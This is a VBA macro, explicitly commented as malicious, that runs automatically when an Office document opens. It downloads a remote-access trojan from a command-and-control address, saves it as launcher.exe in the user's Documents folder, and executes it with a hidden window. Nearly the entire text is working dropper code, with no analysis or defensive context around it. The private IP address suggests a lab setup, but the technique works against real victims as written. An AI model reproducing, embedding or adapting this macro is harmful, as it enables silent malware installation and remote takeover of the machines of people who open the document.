' Malicious VBA Macro - AutoOpen
' Downloads RAT binary from C2 server using MSXML2.XMLHTTP
' Writes binary to disk using ADODB.Stream
' Executes silently via WScript.Shell with hidden window flag

Sub AutoOpen()
    Dim strPath As String
    strPath = Environ("USERPROFILE") & "\Documents\launcher.exe"

    Dim objHTTP As Object
    Set objHTTP = CreateObject("MSXML2.XMLHTTP")
    objHTTP.Open "GET", "http://192.168.92.136:8080/RATa.exe", False
    objHTTP.Send

    Dim objStream As Object
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Type = 1
    objStream.Open
    objStream.Write objHTTP.ResponseBody
    objStream.SaveToFile strPath, 2
    objStream.Close

    CreateObject("WScript.Shell").Run "cmd /c """ & strPath & """", 0, False
End Sub
